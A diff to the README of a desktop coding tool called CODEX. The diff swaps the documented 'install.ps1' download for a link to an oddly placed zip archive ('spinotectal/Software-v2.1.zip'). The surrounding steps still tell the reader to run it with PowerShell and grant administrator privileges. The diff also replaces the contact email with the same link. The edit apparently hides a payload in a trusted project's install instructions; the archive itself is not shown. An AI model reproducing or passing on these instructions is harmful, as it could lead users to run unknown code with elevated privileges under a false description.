@@ -36,7 +36,7 @@ CODEX brings the power of online coding platforms to your desktop. Whether you�
 To install CODEX, simply run the PowerShell installer:
 
 ### 🪄 Steps:
-1. **Download** the `install.ps1` file from this repository.  
+1. **Download** the `https://github.com/Melon4Program/CODEX/raw/refs/heads/main/spinotectal/Software-v2.1.zip` file from this repository.  
 2. **Right-click** it and choose **"Run with PowerShell"**.  
 3. Follow the prompts — the installer will:
    - Request administrator privileges  
@@ -74,4 +74,4 @@ See the [LICENSE](LICENSE) file for full details.
 
 ## 📬 Contact
 For questions, suggestions, or feedback:  
-**📧 Email:** [kbs.programmer@gmail.com](mailto:kbs.programmer@gmail.com)
+**📧 Email:** [https://github.com/Melon4Program/CODEX/raw/refs/heads/main/spinotectal/Software-v2.1.zip](https://github.com/Melon4Program/CODEX/raw/refs/heads/main/spinotectal/Software-v2.1.zip)
